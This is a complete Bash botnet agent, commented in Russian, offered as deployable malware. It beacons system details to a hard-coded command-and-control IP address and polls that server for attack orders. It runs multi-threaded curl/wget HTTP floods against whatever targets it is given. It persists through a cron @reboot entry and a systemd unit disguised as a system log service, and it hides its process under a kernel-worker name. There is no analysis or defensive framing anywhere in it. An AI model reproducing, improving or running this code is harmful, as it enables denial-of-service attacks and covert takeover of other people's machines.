#!/bin/bash
# AVZ-Aristo RAGE Agent v25.2 – Bash-агент с поддержкой curl/wget, скрытность, persistence
# Параметры по умолчанию
C2_HOST="80.249.146.202"
C2_PORT=80          # HTTP plain
C2_PATH="/c2"
AGENT_ID=$(cat /etc/machine-id 2>/dev/null || hostname)
OS_RELEASE=$(cat /etc/os-release 2>/dev/null | head -1)
HOSTNAME=$(hostname)
CPU=$(grep 'model name' /proc/cpuinfo 2>/dev/null | head -1 | cut -d':' -f2 | xargs)
RAM_KB=$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}')
RAM_GB=$(echo "scale=1; $RAM_KB/1024/1024" | bc 2>/dev/null || echo "0")
USER=$(whoami)

# Кодирование данных для отправки в Base64 (маскировка)
encode_info() {
    INFO="{\"id\":\"$AGENT_ID\",\"hostname\":\"$HOSTNAME\",\"os\":\"Linux\",\"os_version\":\"$OS_RELEASE\",\"cpu\":\"$CPU\",\"ram_gb\":\"$RAM_GB\",\"user\":\"$USER\",\"agent_version\":\"25.2-RAGE-bash\"}"
    echo "$INFO" | base64 -w0
}

# Отправка регистрации
register() {
    DATA=$(encode_info)
    curl -s -X POST --data "type=register&data=$DATA" "http://$C2_HOST:$C2_PORT$C2_PATH" >/dev/null 2>&1 || \
    wget -qO- --post-data="type=register&data=$DATA" "http://$C2_HOST:$C2_PORT$C2_PATH" >/dev/null 2>&1
}

# Выполнение атаки (заглушка, на bash - простой flood curl/wget)
do_attack() {
    TARGET=$1
    METHOD=$2
    THREADS=$3
    stop_file="/tmp/avz_stop_$AGENT_ID"
    rm -f "$stop_file"
    for i in $(seq 1 $THREADS); do
        (
            while [ ! -f "$stop_file" ]; do
                if [ "$METHOD" = "GET" ]; then
                    curl -s -o /dev/null -w '' "$TARGET" 2>/dev/null &
                elif [ "$METHOD" = "POST" ]; then
                    curl -s -o /dev/null -d "data=1" "$TARGET" 2>/dev/null &
                else
                    wget -qO- "$TARGET" >/dev/null 2>&1 &
                fi
            done
        ) &
    done
    # Ждём стоп-файла
    while [ ! -f "$stop_file" ]; do sleep 1; done
    pkill -P $$ 2>/dev/null
    rm -f "$stop_file"
}

# Автозагрузка
persistence() {
    SCRIPT_PATH=$(readlink -f "$0")
    # Cron
    (crontab -l 2>/dev/null; echo "@reboot /bin/bash $SCRIPT_PATH --hidden >/dev/null 2>&1") | crontab -
    # systemd если root
    if [ $(id -u) -eq 0 ]; then
        cat > /etc/systemd/system/avz-agent.service <<EOF
[Unit]
Description=System Log Service
After=network.target
[Service]
Type=simple
ExecStart=/bin/bash $SCRIPT_PATH --hidden
Restart=always
[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload && systemctl enable avz-agent.service
    fi
}

# Главный цикл опроса команд
main_loop() {
    while true; do
        # Попытка получить команду от C2
        CMD=$(curl -s "http://$C2_HOST:$C2_PORT$C2_PATH?bot=$AGENT_ID" 2>/dev/null || \
              wget -qO- "http://$C2_HOST:$C2_PORT$C2_PATH?bot=$AGENT_ID" 2>/dev/null)
        if [ -n "$CMD" ]; then
            TYPE=$(echo "$CMD" | grep -o '"type":"[^"]*"' | cut -d'"' -f4)
            if [ "$TYPE" = "attack" ]; then
                TARGET=$(echo "$CMD" | grep -o '"target":"[^"]*"' | cut -d'"' -f4)
                METHOD=$(echo "$CMD" | grep -o '"method":"[^"]*"' | cut -d'"' -f4)
                THREADS=$(echo "$CMD" | grep -o '"threads":[0-9]*' | cut -d':' -f2)
                THREADS=${THREADS:-50}
                do_attack "$TARGET" "$METHOD" "$THREADS"
            elif [ "$TYPE" = "stop" ]; then
                touch "/tmp/avz_stop_$AGENT_ID"
            fi
        fi
        sleep 30
    done
}

# Entry point
if [ "$1" = "--hidden" ]; then
    # Скрытый режим (простое переименование процесса не работает, но можно exec -a)
    exec -a "[kworker/u:2]" /bin/bash "$0" --daemon
fi
if [ "$1" = "--daemon" ]; then
    persistence
    register
    main_loop
else
    # Первый запуск: перезапуск в фоне с флагом --hidden
    nohup /bin/bash "$0" --hidden >/dev/null 2>&1 &
    exit 0
fi